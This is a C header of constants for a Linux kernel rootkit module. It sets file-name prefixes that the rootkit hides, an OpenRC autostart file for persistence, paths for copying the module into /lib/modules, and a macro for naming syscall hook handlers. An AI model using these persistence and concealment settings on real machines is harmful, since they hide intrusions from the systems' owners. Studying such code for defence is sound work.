#ifndef _ROOTKIT_CONSTANTS_H_
#define _ROOTKIT_CONSTANTS_H_

#include "uapi/rootkit.h"
#include <linux/types.h>
#include <vdso/limits.h>

typedef struct string_tag {
    const char *const s_str; // String value
    const size_t sz_len;     // String length
} string_t;

#define PRINTK_PREFIX "[ROOTKIT] "

#define HIDDEN_PREFIXES ".rootkit_", "rootkit_" /* List of prefixes for hidden files/directories */

extern const string_t S_HIDDEN_PREFIXES[]; // Prefixes for hidden files/directories

#define MOD_ALIAS ".rootkit" /* Module alias (to check if rootkit is already loaded) */

#define LOCALD_FILE "/etc/local.d/rootkit_load.start" /* Autostart file (OpenRC `local` service) */
#define LOCALD_SIZE 256

#define MOD_FILE "/root/%s.ko"            /* Module file in /root/ */
#define MOD_COPY "/lib/modules/%s_mod.ko" /* Module file in /lib/modules/ (copied) */

#define PID_ANY (pid_t) INT_MIN /* Any PID */
#define SIG_ANY INT_MIN         /* Any signal */

#define ROOT_UID (uid_t)0 /* The root user ID */
#define ROOT_GID (gid_t)0 /* The root group ID */

#define OFFSET_MIN (loff_t)(-OFFSET_MAX - 1) /* Minimum value for a `loff_t` variable */

/**
 * Defines how to name a syscall hook handler function.
 * The function name is `_new_<syscall_name>_handler`.
 *
 * @param _syscall_name The syscall name
 * @return The hook handler function name
 */
#define HOOK_HANDLER_NAME(_syscall_name) _new_##_syscall_name##_handler

#endif
